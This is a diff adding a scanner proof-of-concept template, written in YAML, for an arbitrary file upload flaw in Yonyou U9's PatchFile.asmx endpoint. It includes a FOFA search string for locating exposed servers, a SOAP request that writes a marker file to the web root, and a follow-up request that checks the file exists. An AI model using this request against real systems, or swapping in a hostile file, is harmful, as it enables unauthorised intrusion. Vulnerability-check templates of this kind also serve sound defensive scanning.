@@ -1,0 +1,42 @@
+id: poc-yaml-yongyou-u9-patchfile-asmx-anyfile-upload
+info:
+  name: 用友U9 PatchFile.asmx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U9
+  fofa: title=="        U9-登录    "
+variables:
+  t1: random_str(3)
+  t2: md5(t1)
+  t3: base64(t2)
+requests:
+- method: POST
+  path: /CS/Office/AutoUpdates/PatchFile.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <SaveFile xmlns="http://tempuri.org/">
+
+    <binData>{{.t3}}</binData>
+
+    <path>./</path>
+
+    <fileName>{{.t1}}.txt</fileName>
+
+    </SaveFile>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"true") && contains(headers,"text/xml")
+- method: GET
+  path: /CS/Office/AutoUpdates/{{.t1}}.txt
+  expression: status_code == 200 && body == t2
+transport: http
